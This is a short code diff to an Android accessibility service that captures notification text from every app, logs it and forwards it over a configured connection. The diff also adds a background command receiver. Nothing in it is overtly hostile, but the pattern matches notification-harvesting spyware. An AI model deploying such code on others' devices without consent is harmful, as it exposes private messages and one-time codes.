@@ -14,10 +14,15 @@ public class NotificationWatchdogService extends AccessibilityService {
     private static final int EVENT_NOTIFICATION_TIMEOUT_MILLIS = 80;
     private static final String[] PACKAGE_NAMES = new String[] {};
     private static final String TAG = "NotificationWatchdog";
-
+    private ConnectionConfig mcc;
+    private CommandReceiver mcr;
+    public void onCreate() {
+        mcc = new ConnectionConfig(this);
+        mcr = new CommandReceiver(this);
+        mcr.start();
+    }
     public void onAccessibilityEvent(AccessibilityEvent event) {
         if (event.getEventType()==AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
-            android.os.Debug.waitForDebugger();
             Log.i(TAG, "onAccessibilityEvent");
             Log.i(TAG, (String) event.getPackageName());
             for (CharSequence subText: event.getText()) {
@@ -26,9 +31,9 @@ public class NotificationWatchdogService extends AccessibilityService {
             Parcelable data = event.getParcelableData();
             if (data instanceof Notification) {
                 Notification notification = (Notification) data;
-                SharedPreferences sp = getSharedPreferences("connection", MODE_PRIVATE);
+                //SharedPreferences sp = getSharedPreferences("connection", MODE_PRIVATE);
                 try {
-                    NotificationSender ns = new NotificationSender(notification, sp);
+                    NotificationSender ns = new NotificationSender(notification, mcc);
                     ns.send();
                 } catch (Exception e) {
                     e.printStackTrace();
